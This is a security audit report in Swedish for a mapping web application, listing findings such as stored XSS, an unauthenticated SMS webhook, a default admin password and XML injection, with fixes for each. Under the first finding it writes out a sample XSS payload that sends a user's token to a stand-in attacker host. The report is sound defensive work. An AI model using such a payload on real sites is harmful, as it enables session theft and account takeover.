# Säkerhetsgranskning — Resursläge

**Datum:** 2026-07-01
**Granskningsobjekt:** Hela repot (Docker: React/MapLibre-frontend, Express/Node-backend, PostGIS)
**Metod:** Manuell kodgranskning (backend-routes, middleware, frontend-rendering, docker-compose, DB-schema)

Status per fynd markeras `[ ]` öppen / `[x]` åtgärdad. Uppdatera denna fil när fynd rättas.

---

## 🔴 HÖG

### [ ] 1. Lagrad XSS via drivmedelsstationers namn → tokenstöld

**Plats:** `frontend/src/components/MapView.tsx:605`

```js
.setHTML(`<div style="font-size:12px;font-weight:600;margin-bottom:8px">⛽ ${String(p.name)}</div>${bars}${date}`)
```

`p.name` kommer direkt från `features.name` i databasen och injiceras oescapat i MapLibres `setHTML()` — till skillnad från övriga komponenter (t.ex. `FeaturePanel.tsx`) som React-renderar och därmed auto-escaperar. Namnfältet sätts fritt av vilken `editor`/`admin`-användare som helst via `POST /api/features` eller CSV/GeoJSON-import (`backend/src/routes/import.js`).

**Konsekvens:** En användare med editor-behörighet (eller ett kapat editor-konto) kan skapa en `fuel`-nod med namn t.ex. `<img src=x onerror="fetch('https://attacker/'+localStorage.token)">`. Så fort en annan inloggad användare hovrar över noden på kartan körs koden i deras webbläsare. JWT-token lagras i `localStorage` (`frontend/src/contexts/AuthContext.tsx:20,30`) och är direkt åtkomlig för injicerad JS. Helmets CSP är dessutom avstängd (`backend/src/index.js:13`, `contentSecurityPolicy: false`), så inget nätverkslager-skydd finns.

**Effekt vid utnyttjande:** Stöld av admin-token → full kontroll över lägesbilden (skapa/ändra/radera samtliga lager, hantera användare).

**Rekommendation:**
1. Escapea `p.name` (och alla andra användarstyrda fält) innan `setHTML()` — bygg med `document.createElement`/`textContent`, eller återanvänd escape-mönstret som redan finns i `backend/src/routes/export.js:38` (`escXML()`).
2. Aktivera en restriktiv CSP i helmet istället för att stänga av den helt.
3. Överväg att flytta JWT från `localStorage` till en `httpOnly`-cookie (kräver CSRF-skydd i gengäld, men minskar total skada av framtida XSS).

---

## 🟠 MEDEL

### [ ] 2. SMS-webhook saknar applikationsnivå-autentisering

**Plats:** `backend/src/routes/sms.js:21` (`POST /api/sms/incoming`)

Endpointen har ingen `requireAuth` (rimligt — 46elks kan inte skicka JWT) men saknar även all annan verifiering: ingen delad hemlighet, ingen HMAC-signaturkontroll, ingen IP-allowlist i koden. Skyddet är helt beroende av en Cloudflare Access-bypassregel som enligt `README.md` (Roadmap punkt 7) ännu inte är aktiverad — webhooken är för närvarande blockerad av CF Access.

**Risk vid aktivering:** Om CF-bypassregeln blir bredare än avsett (vanligt misstag — path-baserad istället för IP-baserad) blir endpointen fullt öppen mot internet. Vem som helst kan då posta falska "SMS-larm" med godtyckligt namn/beskrivning/koordinat rakt in i lägesbilden.

**Rekommendation:** Lägg till en delad hemlighet i applikationslagret innan bypass-regeln aktiveras — t.ex. Basic Auth i webhook-URL:en (stöds nativt av 46elks) eller ett hemligt query-parameter/token jämfört med `crypto.timingSafeEqual`. Förlita er inte enbart på nätverkslagret för en internet-exponerad endpoint.

---

### [ ] 3. Fallback-lösenord för adminkontot

**Plats:** `backend/src/index.js:41`

```js
const password = process.env.ADMIN_PASSWORD || 'admin123';
```

Om `ADMIN_PASSWORD` inte sätts vid driftsättning skapas adminkontot tyst med lösenordet `admin123`, som är offentligt känt via detta öppna repo.

**Rekommendation:** Kräv `ADMIN_PASSWORD` explicit — låt applikationen krascha vid start om variabeln saknas (motsvarande hur `JWT_SECRET` redan hanteras implicit). Överväg tvingat lösenordsbyte vid första inloggning.

---

## 🟡 LÅG

### [ ] 4. Inkonsekvent behörighetskontroll i skördningsrutter

**Plats:** `backend/src/routes/harvest.js:667` (`POST /situations/scrape`) och `:1038` (`POST /power/scrape`)

Dessa två skrivande endpoints har endast `requireAuth`, medan alla övriga skrivande skördningsrutter (`osm/scrape`, `okq8/scrape`, `bridges/scrape`, `police/scrape` m.fl.) korrekt kräver `requireRole('editor','admin')`. En `reader`-användare (avsedd läsbehörighet) kan trigga databasskrivningar och upprepade externa anrop mot Trafikverket/avbrott.se.

**Rekommendation:** Lägg till `requireRole('editor','admin')` på dessa två rutter.

---

### [ ] 5. Ingen brute-force-begränsning på inloggning

**Plats:** `backend/src/routes/auth.js:9` (`POST /api/auth/login`)

Ingen rate limiting (t.ex. `express-rate-limit`) på inloggningsendpointen. Dämpas i nuläget av att Cloudflare Access sitter framför hela appen, men bör åtgärdas som defense-in-depth.

**Rekommendation:** Rate limiting per IP/användarnamn samt kontolåsning efter X misslyckade försök.

---

### [ ] 6. Ovaliderad användarindata i utgående XML mot Trafikverket

**Plats:** `backend/src/routes/trafikverket.js:76` (`bboxFilter`) — används i `/cameras`, `/ferries`, `/atk`, `/roads`, `/traffic`, `/situations`

```js
`<WITHIN name="${field}" shape="box" value="${minlng} ${minlat}, ${maxlng} ${maxlat}"/>`
```

`minlng/minlat/maxlng/maxlat` från `req.query` interpoleras oescapat i XML-body som skickas till Trafikverkets API. Ingen SQL-injektionsrisk (går aldrig mot egen databas), men ingen validering att värdena är numeriska — möjliggör att bryta ut ur `value`-attributet och injicera egna XML-element i frågan mot tredjepartstjänsten.

**Rekommendation:** Validera att alla fyra värden är parsebara flyttal inom rimligt intervall innan de används i frågesträngen.

---

### [ ] 7. Bristande spårbarhet (audit trail)

`activity_log`-tabellen (`db/init.sql`) loggar endast create/update/delete på `features`. Administrativa åtgärder — användarhantering (`POST/DELETE /api/auth/users`), ändring av `settings` (t.ex. `op_municipalities`) — loggas inte. Misslyckade inloggningsförsök loggas heller inte.

**Rekommendation:** Utöka loggningen till administrativa händelser och misslyckade inloggningsförsök.

---

### [ ] 8. Övriga härdningsförslag
- `jwt.verify()` i `backend/src/middleware/auth.js:7` anger inte `algorithms: ['HS256']` explicit. Biblioteket skyddar redan mot `alg:none`, men explicit restriktion är god praxis.
- Verifiera att TLS/HSTS terminerar korrekt i kedjan (Cloudflare Tunnel) — appen själv kör obehandlad HTTP på port 80 internt.

---

## Positiva observationer (ingen åtgärd krävs)

- **Ingen SQL-injektion påträffad** — samtliga databasanrop använder parameteriserade frågor (`$1, $2...`) genomgående, inklusive skördnings- och importrutter.
- `.env` är korrekt gitignorad och har aldrig committats i git-historiken.
- Lösenord hashas med bcrypt (cost 10); inloggning läcker inte om det är användarnamn eller lösenord som är fel.
- Backend är inte direkt nätverksexponerad — endast nginx (port 80) publiceras i `docker-compose.yml`; API nås enbart via reverse proxy.
- CoT/KML-export XML-escapear korrekt (`export.js` → `escXML()`).
- `features.layer` har en DB-nivå CHECK-constraint som begränsar tillåtna lagernamn.

---

## Prioriterad åtgärdslista

1. Fixa den lagrade XSS:en i `MapView.tsx:605` (fynd #1) — enda vägen till fullständig kompromettering.
2. Lägg till applikationsnivå-autentisering på SMS-webhooken (fynd #2) innan CF-bypassregeln aktiveras.
3. Ta bort fallback-lösenordet `admin123` (fynd #3).
4. Rätta rollkontrollen på `situations/scrape` och `power/scrape` (fynd #4).
5. Inför rate limiting på login (fynd #5) samt bredare audit-loggning (fynd #7).
